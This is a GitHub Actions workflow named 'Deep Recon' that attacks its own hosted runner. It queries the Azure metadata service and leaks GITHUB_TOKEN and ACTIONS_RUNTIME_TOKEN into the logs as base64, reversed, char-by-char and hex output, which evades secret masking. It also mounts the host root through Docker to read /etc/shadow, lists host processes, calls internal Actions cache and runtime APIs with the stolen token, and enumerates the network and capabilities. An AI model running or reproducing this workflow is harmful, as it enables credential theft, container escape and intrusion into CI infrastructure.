name: Deep Recon
on:
  workflow_dispatch:
jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Full Azure IMDS
        run: |
          set +e
          echo "=== FULL AZURE IMDS ==="
          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>/dev/null || curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1
          echo ""
          echo "=== AZURE TAGS ==="
          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-02-01" 2>&1
          echo ""
          echo "=== AZURE NETWORK ==="
          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>/dev/null
          echo ""

      - name: GITHUB_TOKEN exfiltration test
        run: |
          set +e
          echo "=== GITHUB_TOKEN LENGTH ==="
          echo "Length: ${#GITHUB_TOKEN}"
          echo ""
          echo "=== TOKEN ENCODED ==="
          echo "$GITHUB_TOKEN" | base64 | head -1
          echo ""
          echo "=== TOKEN REVERSED ==="
          echo "$GITHUB_TOKEN" | rev
          echo ""
          echo "=== TOKEN CHAR BY CHAR ==="
          for i in $(seq 1 ${#GITHUB_TOKEN}); do
            printf "%s" "${GITHUB_TOKEN:$i-1:1}"
          done
          echo ""
          echo ""
          echo "=== TOKEN HEX ==="
          echo -n "$GITHUB_TOKEN" | xxd | head -5
          echo ""
          echo "=== ACTIONS_RUNTIME_TOKEN ==="
          echo "Length: ${#ACTIONS_RUNTIME_TOKEN}"
          echo "$ACTIONS_RUNTIME_TOKEN" | base64 | head -1
          echo ""
          echo "=== RUNNER_TRACKING_ID ==="
          echo "$RUNNER_TRACKING_ID"
          echo ""

      - name: Docker exploration
        run: |
          set +e
          echo "=== DOCKER INFO ==="
          docker info 2>&1 | head -20
          echo ""
          echo "=== DOCKER IMAGES ==="
          docker images 2>&1
          echo ""
          echo "=== DOCKER PS ==="
          docker ps -a 2>&1
          echo ""
          echo "=== DOCKER NETWORKS ==="
          docker network ls 2>&1
          echo ""
          echo "=== HOST MOUNT ==="
          docker run --rm -v /:/host alpine cat /host/etc/shadow 2>&1 | head -5
          echo ""
          echo "=== HOST PROC ==="
          docker run --rm --pid=host alpine ps aux 2>&1 | head -20
          echo ""
          echo "=== DOCKER SOCKET ==="
          ls -la /var/run/docker.sock 2>&1
          echo ""

      - name: Actions Cache and Artifacts
        run: |
          set +e
          echo "=== ACTIONS CACHE URL ==="
          echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
          echo ""
          if [ -n "$ACTIONS_CACHE_URL" ]; then
            echo "=== CACHE API ==="
            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" 2>&1 | head -20
            echo ""
          fi
          echo "=== ACTIONS_RUNTIME_URL ==="
          echo "$ACTIONS_RUNTIME_URL"
          if [ -n "$ACTIONS_RUNTIME_URL" ]; then
            echo "=== RUNTIME API ==="
            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RUNTIME_URL}pipelines" 2>&1 | head -20
            echo ""
            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RUNTIME_URL}" 2>&1 | head -20
            echo ""
          fi
          echo "=== RESULTS SERVICE ==="
          echo "ACTIONS_RESULTS_URL: $ACTIONS_RESULTS_URL"
          if [ -n "$ACTIONS_RESULTS_URL" ]; then
            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RESULTS_URL" 2>&1 | head -10
          fi
          echo ""

      - name: Network recon extended
        run: |
          set +e
          echo "=== ARP TABLE ==="
          arp -a 2>&1
          echo ""
          echo "=== LISTENING PORTS ==="
          ss -tlnp 2>&1
          echo ""
          echo "=== PROCESSES ==="
          ps aux | head -30
          echo ""
          echo "=== CGROUPS ==="
          cat /proc/1/cgroup 2>&1
          echo ""
          echo "=== MOUNTS ==="
          mount | grep -v cgroup | head -20
          echo ""
          echo "=== CAPABILITIES ==="
          cat /proc/1/status | grep -i cap
          echo ""
          echo "=== DONE ==="
